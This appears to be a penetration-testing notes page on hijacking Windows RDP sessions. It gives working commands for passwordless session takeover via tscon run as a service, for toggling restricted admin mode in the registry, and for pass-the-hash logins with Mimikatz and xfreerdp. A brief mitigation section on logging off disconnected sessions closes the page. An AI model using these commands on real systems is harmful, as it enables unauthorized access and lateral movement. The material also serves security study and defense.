# RDP Session Hijacking

## <mark style="color:red;">Intro</mark>

<mark style="color:green;">**RDP hijacking attacks involve the attacker “resuming” a previously disconnected RDP session (without a proper logout)**</mark>. This allows the attacker to get into a privileged system without having to steal the user’s credentials. For example, if an administrator remoted into a Windows Server machine a few days ago, it is much easier for the attacker to “resume” this very session, rather than attempting to obtain the administrator account’s password.

{% hint style="info" %}
Connecting to a workstation with Remote Desktop will disconnect any existing session. The `/admin` flag allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.
{% endhint %}

## <mark style="color:red;">Passwordless hijacking</mark>

Let’s focus on the RDP hijacking technique leveraging the [Tscon.exe](https://support.microsoft.com/en-us/help/302801/the-use-of-tscon-exe-can-leave-a-previously-locked-console-unlocked) utility, which comes with Windows. It enables a user to connect to a different remote desktop session on a system or switch between different sessions.

The syntax for the command is simple:

```powershell
tscon {<SessionID> | <SessionName>} [/dest:<SessionName>] [/password:<pw> | /password:*] [/v]
```

The simplest example would be `tscon 2`.

&#x20;Running such a command on a server hosting the remote desktop session would connect the user to session with ID 2 and disconnect any existing sessions they are on.&#x20;

to resume a previously disconnected RDP session an attacker with system-level access can setup a service with this syntax:

```powershell
sc create hijackedsession binpath= “cmd.exe /k tscon 1 /dest:rdp-tcp#2”
net start hijackedsession

```

This will disconnect the current session of the attacker and “resume” the previously disconnected session between the attacker and the RDP server without asking for a password or leaving much of a forensic trace.

## <mark style="color:red;">restricted admin mode</mark>

Since clear text credentials are required for all interactive logins, <mark style="color:green;">**Microsoft introduced RDP with restricted admin mode which allows system administrators to perform a network login with RDP**</mark> In an attempt to prevent attackers from stealing credentials on a compromised server.

<mark style="color:green;">**A network login does not require clear text credentials and will not store them in memory, essentially disabling single sign-on.**</mark> This type of login is commonly used by service accounts.

We can use restricted admin mode by supplying the /restrictedadmin argument to mstsc.exe. When we supply this argument, <mark style="color:green;">**the current login session is used to authenticate the session :**</mark>

```
mstsc.exe /restrictedadmin
```

## <mark style="color:red;">Pass-the-Hash with mstsc.exe</mark>

Restricted admin mode is disabled by default but the setting can be controlled through the `DisableRestrictedAdmin` registry entry at the following path:

```
HKLM:\System\CurrentControlSet\Control\Lsa
```

{% hint style="success" %}
While restricted admin mode protects against credential theft on the target, when enabled, it is possible to pass the hash when doing lateral movement with mstsc.
{% endhint %}

```
sekurlsa::pth /user:admin /domain:corp1  /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

to disable restricted admin mode, run this as admin:

```
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
```

to enable it, first run a local powershell session as admin user:

```
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

and enable restricted admin mode:

```
Enter-PSSession -Computer appsrv01 
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

{% hint style="info" %}
#### <mark style="color:green;">xfreerdp RDP client, which is installed on a Kali system by default, supports restricted remote admin connections as well.</mark>
{% endhint %}

```
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

## <mark style="color:red;">Mitigation</mark>

Due to the nature of RDP protocol and the behavior exploited by this technique, monitoring for an RDP hijacking attack is difficult because, to forensic tools, the activity looks as if a legitimate, authorized remote user was accessing the system.

**Enforce Group Policy:** Instead of leaving “disconnected” remote desktop sessions in dormant state for long, Group Policy settings should be changed to log off users either instantly or shortly after they have disconnected an RDP session. This will prevent an attacker from simply “resuming” a session in a credential-less manner.
